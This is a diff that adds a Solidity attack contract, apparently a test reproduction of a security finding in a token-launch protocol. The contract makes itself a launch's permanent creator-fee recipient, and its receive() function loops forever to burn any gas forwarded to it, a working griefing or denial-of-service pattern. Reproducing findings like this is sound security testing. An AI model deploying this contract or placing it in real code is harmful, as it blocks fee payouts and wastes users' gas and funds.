@@ -99,3 +99,29 @@ interface ICurveLike {
     function sell(uint256 tokensIn, uint256 minEthOut, address recipient) external returns (uint256);
     function graduated() external view returns (bool);
 }
+
+interface IRecursiveLaunch {
+    function launchRecursive(string calldata name_, string calldata symbol_) external payable returns (address);
+}
+
+/**
+ * @title GasBurningLauncher
+ * @author 0xDAVZER
+ * @notice Launches a recursive strategy, which makes it that launch's creator fee recipient for
+ * good, and then burns every drop of gas any payment forwards it. This is the ungated shape of
+ * the e2e mainnet-fork finding of 2026-10-05: anyone can deploy it and launch, so no curation
+ * stands between it and a curve.
+ */
+contract GasBurningLauncher {
+    function launch(IRecursiveLaunch factory) external payable returns (address) {
+        return factory.launchRecursive{value: msg.value}("Gas Burner", "sBURN");
+    }
+
+    receive() external payable {
+        while (true) {
+            assembly {
+                pop(keccak256(0, 32))
+            }
+        }
+    }
+}
